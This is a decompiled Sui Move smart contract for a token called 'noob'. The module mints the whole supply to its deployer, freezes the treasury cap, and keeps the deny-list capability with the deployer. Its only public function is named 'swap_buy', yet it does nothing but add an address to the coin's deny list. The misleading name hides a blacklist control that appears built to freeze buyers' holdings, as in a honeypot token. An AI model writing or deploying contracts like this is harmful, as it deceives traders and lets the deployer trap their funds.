module 0x2e9fe31d0d7cc068eeb1b7fbfb4fe467c448ceed868c61316cf6c5254dad4e6e::noob {
    struct NOOB has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: NOOB, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<NOOB>(arg0, 9, b"noob", b"noob", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://gateway.pinata.cloud/ipfs/QmSqmm4auGH7oXEkDWer5tozW5ymk9UhdwPh22cfqD1hSQ"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<NOOB>(&mut v3, 1000000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<NOOB>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<NOOB>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<NOOB>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<NOOB>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<NOOB>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

